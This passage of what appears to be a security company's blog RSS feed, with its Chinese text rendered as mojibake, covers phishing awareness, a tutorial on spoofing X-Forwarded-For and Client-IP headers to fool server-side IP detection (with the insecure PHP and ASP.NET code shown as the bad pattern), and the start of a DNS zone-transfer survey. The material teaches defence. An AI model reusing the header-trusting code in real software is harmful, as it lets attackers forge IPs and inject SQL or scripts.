&lt;h3 id=&quot;Èá£È≠öÈÉµ‰ª∂‰∏çÊ≠ªÂà•ÂÜçÊääËá™Â∑±Áï∂ÊàêËÇ•Áæä‰∫Ü&quot;&gt;Èá£È≠öÈÉµ‰ª∂‰∏çÊ≠ªÔºåÂà•ÂÜçÊääËá™Â∑±Áï∂ÊàêËÇ•Áæä‰∫ÜÔºÅ&lt;/h3&gt;

&lt;p&gt;Èá£È≠öÊîªÊìäÊúÄÊó©Âæû 1995 Âπ¥Â∞±ÈñãÂßãÁõõË°åÔºå‰∏ÄÁõ¥Âà∞Âø´ 20 Âπ¥ÂæåÁöÑ‰ªäÂ§©ÔºåÈÉΩÈÇÑÊòØ‰∏ÄÂÄãÈùûÂ∏∏Á∞°ÂñÆÂèàÊúâÊïàÁéáÁöÑÊîªÊìäÊâãÊ≥ï„ÄÇÊî∂Âà∞ÈÉµ‰ª∂ÂçÉËê¨Âà•ÂÇªÂÇªÁöÑËº∏ÂÖ•Ëá™Â∑±ÁöÑÂÄãË≥á„ÄÅÂ∏≥ËôüÂØÜÁ¢ºÔºå‰ªîÁ¥∞Áúã‰∏Ä‰∏ãÊîªÊìäËÄÖÁöÑÁ†¥Á∂ªÔºåÂà•ËÆì‰ªñÂæóÈÄû‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊúâÁôºÁèæÁñë‰ººÈá£È≠öÁ∂≤Á´ôÔºåÂèàÁÑ°Ê≥ïÁ¢∫Ë™çÔºåÂèØ‰ª•Âà∞ &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; ‰æÜÊü•Êü•ÁúãÔºåÊâæÂà∞Èá£È≠öÁ∂≤Á´ô‰πüÂèØ‰ª•ÊäïÁ®ø‰∏Ä‰∏ãÂπ´Âä©ÂÖ∂‰ªñ‰∫∫ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/03/apple-id-phishing-scam/</link>
                <guid>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</guid>
                <pubDate>Thu, 03 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÂèñÂæó‰ΩøÁî®ËÄÖ IPÔºü</title>
                <description>&lt;p&gt;ÂæàÂ§öÁ∂≤Á´ôÈÉΩÊúÉÊúâÂÅµÊ∏¨‰ΩøÁî®ËÄÖ IP ÁöÑÂäüËÉΩÔºå‰∏çÁÆ°ÊòØÂà§Êñ∑‰ΩøÁî®ËÄÖ‰æÜËá™Âì™ÈÇäÔºåÊàñËÄÖÊòØË®òÈåÑ‰ΩøÁî®ËÄÖÁöÑ‰ΩçÁΩÆ„ÄÇ‰ΩÜÊòØ‰Ω†Áü•ÈÅìÂóéÔºüÁ∂≤Ë∑Ø‰∏äÂ§ßÂ§öÊï∏ÁöÑÊïôÂ≠∏ÂÖ®ÈÉ®ÈÉΩÊòØ„ÄåÈåØË™§„ÄçÁöÑ„ÄÇÊ≠£Á¢∫ÁöÑÁ®ãÂºèÂØ´Ê≥ïÂèØ‰ª•Á¢∫‰øùÁü•ÈÅìË®™ÂÆ¢ÁöÑ IPÔºå‰ΩÜÊòØÈåØË™§ÁöÑÂØ´Ê≥ïÂçªÂèØËÉΩËÆìÁ∂≤Á´ôÁÆ°ÁêÜËÄÖÊ∞∏ÈÅ†‰∏çÁü•ÈÅìÁäØÁΩ™ËÄÖÁöÑ‰æÜÊ∫ê„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÊ¨°ÊàëÂÄëÂñÆÂ∞±ÂÅµÊ∏¨ IP ÁöÑË≠∞È°å‰æÜÊé¢Ë®éÂêÑÁ®ÆÈåØË™§ÁöÑÂØ´Ê≥ï„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;‰Ω†Áü•ÈÅìÁ∂≤Ë∑Ø‰∏äÁöÑÊïôÂ≠∏ÊòØ‰∏çÂÆâÂÖ®ÁöÑÂóé&quot;&gt;‰Ω†Áü•ÈÅìÁ∂≤Ë∑Ø‰∏äÁöÑÊïôÂ≠∏ÊòØ‰∏çÂÆâÂÖ®ÁöÑÂóéÔºü&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÂÖà‰æÜÁúã‰∏Ä‰∏ãÁ∂≤Ë∑Ø‰∏äÁöÑÊïôÂ≠∏ÔºåËÆìÊàëÂÄë Google Êâæ‰∏Ä‰∏ã„Äå&lt;a href=&quot;https://www.google.com.tw/search?q=php+ÂèñÂæó+ip&quot;&gt;PHP ÂèñÂæó IP&lt;/a&gt;„ÄçÔºåÂ∞±ÂèØ‰ª•ÁúãÂà∞Ë®±Â§ö‰∫∫ÁÜ±ÂøÉÁöÑÊïôÂ≠∏ÔºåÊàëÂÄëÈö®ÊÑèÊåë‰∏ÄÂÄãÂ∏∏Ë¶ãÁöÑÊïôÂ≠∏‰æÜÁúãÁúã„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ª• PHP ÁÇ∫‰æãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;‰ª• ASP.NET ÁÇ∫‰æãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÂæàÂü∫Êú¨ÁöÑÂØ´Ê≥ï„ÄÅÂæàÊ≠£Á¢∫ÁöÑÊÉ≥Ê≥ïÔºåÂ¶ÇÊûú HTTP Header ‰∏≠ÂåÖÂê´„ÄåClient-IP„ÄçÔºåÂ∞±ÂÖà‰ª•‰ªñÁï∂‰ΩúÁúüÂØ¶ IP„ÄÇËã•ÂåÖÂê´„ÄåX-Forwarded-For„ÄçÔºåÂâáÂèñ‰ªñÁï∂‰ΩúÁúüÂØ¶ IP„ÄÇËã•ÂÖ©ËÄÖÈÉΩÊ≤íÊúâÔºåÂâáÂèñ„ÄåREMOTE_ADDR„ÄçËÆäÊï∏‰ΩúÁÇ∫ÁúüÂØ¶ IP„ÄÇÂõ†ÁÇ∫Áï∂‰ΩøÁî®ËÄÖÈÄ£Á∑öÊôÇÈÄèÈÅé‰ª£ÁêÜ‰º∫ÊúçÂô®ÊôÇÔºåREMOTE_ADDR ÊúÉÈ°ØÁ§∫ÁÇ∫‰ª£ÁêÜ‰º∫ÊúçÂô® Proxy ÁöÑ IP„ÄÇÈÉ®ÂàÜ‰ª£ÁêÜ‰º∫ÊúçÂô®ÊúÉÂ∞á‰ΩøÁî®ËÄÖÁöÑÂéüÂßãÁúüÂØ¶ IP ÊîæÂú® Client-IP Êàñ X-Forwarded-For header ‰∏≠ÂÇ≥ÈÅûÔºåÂ¶ÇÊûúÂú®ËÆäÊï∏‰∏≠ÂëºÂè´ÂâáÂèØ‰ª•ÂèñÂæóÁúüÂØ¶ IP„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊòØ‰Ω†Áü•ÈÅìÂóéÔºü&lt;strong&gt;Á∂≤Ë∑Ø‰∏ä 80% ÁöÑÊïôÂ≠∏ÂØ´Ê≥ïÂÖ®ÈÉ®ÈÉΩÊòØ„ÄåÈåØË™§„ÄçÁöÑ„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰ªÄÈ∫ºÈÄôÊ®£Ë™™Âë¢ÔºüË´ãÂ§ßÂÆ∂Ë®òÂæó‰∏Ä‰ª∂‰∫ãÊÉÖÔºö„Äå&lt;strong&gt;‰ªª‰ΩïÂæûÂÆ¢Êà∂Á´ØÂèñÂæóÁöÑË≥áÊñôÈÉΩÊòØ‰∏çÂèØ‰ø°‰ªªÁöÑÔºÅ&lt;/strong&gt;„Äç&lt;/p&gt;

&lt;h3 id=&quot;Á´ÑÊîπ-http-header&quot;&gt;Á´ÑÊîπ HTTP Header&lt;/h3&gt;

&lt;p&gt;„ÄåX-Forwarded-For„ÄçÈÄôÂÄãËÆäÊï∏ÈõñÁÑ∂„ÄåÊúâÊ©üÊúÉ„ÄçÂèñÂæó‰ΩøÁî®ËÄÖÁöÑÁúüÂØ¶ IPÔºå‰ΩÜÊòØÁî±ÊñºÈÄôÂÄãÂÄºÊòØÂæûÂÆ¢Êà∂Á´ØÂÇ≥ÈÄÅÈÅé‰æÜÁöÑÔºåÊâÄ‰ª•„ÄåÊúâÂèØËÉΩ„ÄçË¢´‰ΩøÁî®ËÄÖÁ´ÑÊîπ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëàâ‰æã‰æÜË™™ÔºåÊàëÂØ´‰∫Ü‰∏ÄÂÄãÂ∞èÁ®ãÂºèÔºåÂÅµÊ∏¨ÈÄô‰∫õÂ∏∏Ë¶ãÁöÑ HTTP Header Âà§Êñ∑ IP„ÄÇ‰∏¶‰∏î‰ΩøÁî® &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; ÈÄôÂÄãÂ∑•ÂÖ∑‰æÜ‰øÆÊîπ HTTP Request„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;È°ØÁ§∫ÁõÆÂâç IP ‰ª•ÂèäÁõ∏Èóú header&quot; title=&quot;È°ØÁ§∫ÁõÆÂâç IP ‰ª•ÂèäÁõ∏Èóú header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;È†ÅÈù¢‰∏äÈ°ØÁ§∫ÁõÆÂâçÊàëÁõÆÂâçÁöÑ IP„Äå49.50.68.17„ÄçÔºå‰∏¶‰∏îÂÖ∂‰ªñÁöÑ header ÊòØÁ©∫ÁöÑ„ÄÇ‰ΩÜÂ¶ÇÊûúÊàë‰ªäÂ§©‰ΩøÁî® Burp Suite ‰πãÈ°ûÁöÑ Proxy Â∑•ÂÖ∑Ëá™Ë°åÁ´ÑÊîπÂ∞ÅÂåÖÔºåÂä†‰∏ä X-Forwarded-For ÊàñÊòØ Client-IP headerÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;‰ΩøÁî® Burp Suite ‰øÆÊîπ HTTP Request Header&quot; title=&quot;‰ΩøÁî® Burp Suite ‰øÆÊîπ HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰øÆÊîπÂÆåÁï¢‰πãÂæåÔºåÂÜçÂà∞ÂéüÊú¨ÁöÑÈ°ØÁ§∫ IP ‰ªãÈù¢ÔºåÊúÉÁôºÁèæÁ∂≤È†ÅÈåØÂ∞áÊàëÁ´ÑÊîπÁöÑ header Áï∂‰ΩúÊ≠£Á¢∫ÁöÑË≥áÊñôÂ°´ÂÖ•„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;È°ØÁ§∫ÈÅ≠Âà∞Á´ÑÊîπÁöÑ HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;‰ΩøÁî®‰ª£ÁêÜ‰º∫ÊúçÂô®-proxy-ÁöÑÊÉÖÊ≥Å&quot;&gt;‰ΩøÁî®‰ª£ÁêÜ‰º∫ÊúçÂô® Proxy ÁöÑÊÉÖÊ≥Å&lt;/h3&gt;

&lt;p&gt;‰ΩøÁî®‰ª£ÁêÜ‰º∫ÊúçÂô®ÁöÑÊÉÖÊ≥Å‰∏ãÔºåHTTP Header ÊúÉÊúâ‰∏çÂêåÁöÑË°åÁÇ∫„ÄÇ‰æãÂ¶Ç Elite Proxy Â¶Ç‰ΩïÈö±ËóèÂÆ¢Êà∂Á´ØÁöÑÁúüÂØ¶ IP„ÄÇ‰ª•‰∏ãÁ∞°ÂñÆ‰ªãÁ¥πÂπæÁ®ÆÂ∏∏Ë¶ãÁöÑÁãÄÊ≥ÅÁµ¶ÂêÑ‰ΩçÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Áõ¥Êé•ÈÄ£Á∑ö-Ê≤íÊúâ‰ΩøÁî®-proxy&quot;&gt;Áõ¥Êé•ÈÄ£Á∑ö ÔºàÊ≤íÊúâ‰ΩøÁî® ProxyÔºâ&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ÂÆ¢Êà∂Á´ØÁúüÂØ¶ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ÁÑ°&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ÁÑ°&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ÊúÄÂæå‰∏ÄÂÄã‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ÂÆ¢Êà∂Á´ØÁúüÂØ¶ IPÔºåÂæå‰ª•ÈÄóÈªû‰∏≤Êé•Â§öÂÄãÁ∂ìÈÅéÁöÑ‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ÊúÄÂæå‰∏ÄÂÄã‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ‰ª£ÁêÜ‰º∫ÊúçÂô® IPÔºåÂæå‰ª•ÈÄóÈªû‰∏≤Êé•Â§öÂÄãÁ∂ìÈÅéÁöÑ‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ‰ª£ÁêÜ‰º∫ÊúçÂô® IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ÁÑ°&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ÁÑ° (Êàñ‰ª•ÈÄóÈªû‰∏≤Êé•Â§öÂÄãÁ∂ìÈÅéÁöÑ‰ª£ÁêÜ‰º∫ÊúçÂô® IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂØ¶ÈöõÊÉÖÊ≥Å&quot;&gt;ÂØ¶ÈöõÊÉÖÊ≥Å&lt;/h3&gt;

&lt;p&gt;Âú®ÊàëÂÄëÊ∏¨Ë©¶ÁöÑÈÅéÁ®ã‰∏≠ÔºåÈÄöÂ∏∏ÊàëÂÄëÈÉΩÊúÉËÆìÁÄèË¶ΩÂô®Ëá™Â∏∂ X-Forwarded-ForÔºå‰∏¶‰∏îËá™Ë°åÂ°´ÂÖ• IP„ÄÇÂ∏∏Â∏∏ÊúÉÁôºÁèæÊúâ‰∏Ä‰∫õÁ∂≤Á´ôÂá∫ÁèæÂ¶Ç‰∏ãÁöÑË≠¶Âëä‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! È°ØÁ§∫ IP ÈåØË™§&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊúâÊ≤íÊúâÊêûÈåØÔºü„Äå‰∏äÊ¨°ÁôªÂÖ•‰ΩçÁΩÆ 127.0.0.1„ÄçÔºüÊ≤íÈåØÔºåÈÄôÂÄãÊòØÁü•ÂêçË´ñÂ£áÂ•ó‰ª∂„Äå&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;„ÄçÁöÑÂäüËÉΩÔºåÊäìÂèñ IP ÁöÑÂäüËÉΩ‰πüÊòØ‰∏çÂÆâÂÖ®ÁöÑÂØ´Ê≥ï„ÄÇ‰πüÊúâÈÄôÊ®£ÁöÑÁ∂ìÈ©óÔºå‰πãÂâçÈñãËëó X-Forwarded-For ÁöÑ header Âà∞‰∏Ä‰∫õÁ∂≤Á´ôÔºåÁ´üÁÑ∂Áõ¥Êé•Âá∫ÁèæÁÆ°ÁêÜËÄÖÂæåÂè∞ÔºÅ&lt;/p&gt;

&lt;p&gt;‰Ω†Ë¶∫ÂæóÂè™Êúâ‰∏ÄËà¨‰∫∫Êí∞ÂØ´ÁöÑÁ®ãÂºèÊúÉÊúâÈÄôÊ®£ÁöÑÂïèÈ°åÂóéÔºüÂÖ∂ÂØ¶Â§ßÂûãÁ∂≤Á´ô‰πüÂèØËÉΩÊúÉÊúâÈ°û‰ººÁöÑÂïèÈ°å„ÄÇÈÄôÊ®£ÁöÑÂØ´Ê≥ïÂèØËÉΩÊúÉËÆìÁÆ°ÁêÜËÄÖÊ∞∏ÈÅ†Êäì‰∏çÂà∞ÁäØÁΩ™ËÄÖÁöÑÁúüÂØ¶ IPÔºåÁîöËá≥ÊîªÊìäËÄÖÂèØ‰ª•Á´ÑÊîπ header ÊèíÂÖ•ÁâπÊÆäÂ≠óÂÖÉÔºåÂ∞çÁ∂≤Á´ôÈÄ≤Ë°å SQL Injection ÊàñËÄÖ Cross-Site Scripting ÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ê≠£Á¢∫ÂèàÂÆâÂÖ®ÁöÑÊñπÂºè&quot;&gt;Ê≠£Á¢∫ÂèàÂÆâÂÖ®ÁöÑÊñπÂºè&lt;/h3&gt;

&lt;p&gt;„Äå&lt;strong&gt;‰ªª‰ΩïÂæûÂÆ¢Êà∂Á´ØÂèñÂæóÁöÑË≥áÊñôÈÉΩÊòØ‰∏çÂèØ‰ø°‰ªªÁöÑÔºÅ&lt;/strong&gt;„Äç&lt;/p&gt;

&lt;p&gt;Ë´ãÂêÑ‰ΩçÈñãÁôºËÄÖ„ÄÅÁÆ°ÁêÜËÄÖË®ò‰ΩèÈÄôÂÄãÂ§ßÂéüÂâáÔºåÈõñÁÑ∂ÈÄô‰∫õ Request Header ÂèØËÉΩÂê´ÊúâÁúüÂØ¶ IP ÁöÑË≥áË®äÔºå‰ΩÜÊòØÂõ†ÁÇ∫‰ªñÁöÑÂÆâÂÖ®ÊÄß‰∏çÈ´òÔºåÂõ†Ê≠§ÊàëÂÄëÁµïÂ∞ç‰∏çËÉΩÂÆåÂÖ®‰ø°Ë≥¥ÈÄôÂÄãÊï∏ÂÄº„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÇ£ÊàëÂÄëË©≤ÊÄéÈ∫ºËôïÁêÜÂë¢ÔºüÊàëÁöÑÂª∫Ë≠∞ÊòØË®òÈåÑÊâÄÊúâÁõ∏ÈóúÁöÑ header Ê¨Ñ‰ΩçÂ≠òÂÖ•Ë≥áÊñôÂ∫´ÔºåÂåÖÂê´„ÄåREMOTE_ADDR„Äç„ÄåX-Forwarded-For„ÄçÁ≠âÁ≠âÔºåÁúüÊ≠£ÊúâÁäØÁΩ™‰∫ã‰ª∂ÁôºÁîüÊôÇÔºåÂ∞±ÂèØ‰ª•Ë™øÂá∫ÊâÄÊúâÂÆåÊï¥ÁöÑ IP Ë≥áË®äÈÄ≤Ë°å‰∫∫Â∑•Âà§Êñ∑ÔºåÊâæÂá∫ÁúüÊ≠£ÁöÑ IP„ÄÇÁï∂ÁÑ∂Âæû header Â≠òÂÖ•ÁöÑÊï∏ÂÄº‰πüÂèØËÉΩÊúÉÈÅ≠Âà∞ÊîªÊìäËÄÖÁ´ÑÊîπÊèíÂÖ•ÁâπÊÆäÂ≠óÂÖÉÂòóË©¶ SQL InjectionÔºåÂõ†Ê≠§Â≠òÂÖ•ÂÄºÂøÖÈ†àÂÖàÁ∂ìÈÅéÈÅéÊøæÔºåÊàñËÄÖ‰ΩøÁî® Prepared Statement ÈÄ≤Ë°åÂ≠òÊîæ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂèØ‰ª•ÂèÉËÄÉÁöÑ HTTP HeaderÔºà‰æùÁÖßÂèØËÉΩÂ≠òÊîæÁúüÂØ¶ IP ÁöÑÈ†ÜÂ∫èÔºâ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED&lt;/li&gt;
  &lt;li&gt;HTTP_X_CLUSTER_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED&lt;/li&gt;
  &lt;li&gt;REMOTE_ADDR (ÁúüÂØ¶ IP ÊàñÊòØ Proxy IP)&lt;/li&gt;
  &lt;li&gt;HTTP_VIA (ÂèÉËÄÉÁ∂ìÈÅéÁöÑ Proxy)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;„ÄåÈß≠ÂÆ¢ÊÄùÁ∂≠„ÄçÂ∞±ÊòØÊâæÂá∫Á∂≤Á´ô‰ªª‰ΩïÂèØËÉΩÁ´ÑÊîπÁöÑÂº±ÈªûÔºåÂæûÁ∂≤È†Å‰∏äÁöÑÂÖÉÁ¥†Âà∞ HTTP Header ÈÉΩÊòØÂòóË©¶ÁöÑÂ∞çË±°„ÄÇÂõ†Ê≠§Ë∫´ÁÇ∫Èò≤Á¶¶ËÄÖ‰∏ÄÂÆöË¶ÅÊ∏ÖÊ•öÁöÑÁü•ÈÅìÂì™‰∫õÊï∏ÂÄºÊòØ‰∏çËÉΩ‰ø°Ë≥¥ÁöÑÔºå‰∏çË¶ÅÂÜçÂèÉËÄÉÁ∂≤Ë∑Ø‰∏äÈåØË™§ÁöÑÊïôÂ≠∏‰∫ÜÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/19/client-ip-detection/</link>
                <guid>https://devco.re/blog/2014/06/19/client-ip-detection</guid>
                <pubDate>Thu, 19 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
                <description>&lt;h3 id=&quot;zone-transfer-‰∏ñÁïåÂ§ßÊè≠Áßò&quot;&gt;Zone Transfer ‰∏ñÁïåÂ§ßÊè≠Áßò&lt;/h3&gt;

&lt;p&gt;ÈÇÑË®òÂæóÂú®‰∏ä‰∏ÄÁØáÊñáÁ´† &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - Âè§ËÄÅÁöÑ DNS Ë≥áÂÆâË≠∞È°å&lt;/a&gt;‰∏≠ÊàëÂÄëÊõæÊèêÂà∞ÔºåËã•Â∞çÂÖ®‰∏ñÁïåÁöÑÁ∂≤Á´ôÈÄ≤Ë°å zone transfer Ê™¢Ê∏¨ÊÅêÊÄïÊúÉÊúâÊõ¥Â§öÈ©ö‰∫∫ÁöÑÊ°à‰æãÂóéÔºüÊ≠£Â•Ω &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 